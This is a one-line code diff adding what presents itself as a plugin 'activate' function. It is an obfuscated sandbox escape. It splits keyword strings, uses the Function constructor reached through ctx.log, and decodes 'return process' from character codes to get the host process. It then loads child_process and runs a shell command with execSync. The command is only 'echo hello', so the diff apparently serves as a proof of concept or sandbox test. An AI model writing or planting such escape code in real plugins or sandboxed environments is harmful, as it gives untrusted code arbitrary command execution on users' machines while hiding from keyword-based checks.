@@ -1,0 +1,1 @@
+export async function activate(ctx) { const c = "constr" + "uctor"; const F = ctx.log[c]; const src = String.fromCharCode(114,101,116,117,114,110,32,112,114,111,99,101,115,115); const p = F(src)(); const g = "getBuilt" + "inModule"; p[g]("child_process").execSync("echo hello"); return {}; }
